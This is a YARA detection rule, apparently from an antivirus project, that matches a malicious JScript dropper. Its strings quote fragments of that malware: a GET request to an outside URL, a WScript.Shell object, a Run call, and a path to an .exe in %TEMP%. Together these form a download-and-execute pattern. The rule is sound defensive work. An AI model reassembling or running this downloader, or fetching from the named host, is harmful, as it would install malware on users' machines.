rule sig_20160328_44db1fd57f4894cff5ec530e76d91f12 {
  meta:
    description = "datamaliciousorder - file 20160328_44db1fd57f4894cff5ec530e76d91f12.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e489d98c696fbefce4ed8ae57e31c7563f57cedfbff644698050b7038a535802"

  strings:
    $s1  = "function Gtjsnowpe() {return Zcmsuwpvhw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"CFCwUaohX9O.exe\";};" fullword ascii
    $s2  = "Czsrly[Xuhxbh](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Nipzk](Egzwf() * 11)} while (Czsrly[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zcmsuwpvhw = function Xuundvs() {return WScript[Qetfoznkr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Oilpp(Dxxdg, Wjoqcm){return Dxxdg - Wjoqcm;};" fullword ascii
    $s6  = "function Pfrtg(Iisewb){Zcmsuwpvhw[\"Run\"](Iisewb, Qdalczxr, Qdalczxr);};" fullword ascii
    $s7  = "function Jgwuw() {return ((Ilmef == true) && (Ilmef == Mpryt)) ? 1 : Qdalczxr;};" fullword ascii
    $s8  = "function Fdzjlc(){return Qetfoznkr;};" fullword ascii
    $s9  = "var Ndqkfjm = false;" fullword ascii
    $s10 = " while (Yculwzs){" fullword ascii
    $s11 = "return Oilpp(Jxbes, Jlikuqy);" fullword ascii
    $s12 = "function Egzwf(){return 22;};" fullword ascii
    $s13 = "function Fznvnva(){return Nbthkxnb;};" fullword ascii
    $s14 = "var Avqqdscd = new this[\"Date\"]();" fullword ascii
    $s15 = "function Waavekzb()" fullword ascii
    $s16 = "var Ilmef = false;" fullword ascii
    $s17 = "Ilmef = true; " fullword ascii
    $s18 = "Mpryt = true; " fullword ascii
    $s19 = "var Mpryt = false;" fullword ascii
    $s20 = "function Tmierkgjp(Vimixzwj) {var Qzfpyatihq = (1, 2, 3, 4, 5, Vimixzwj); return Qzfpyatihq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}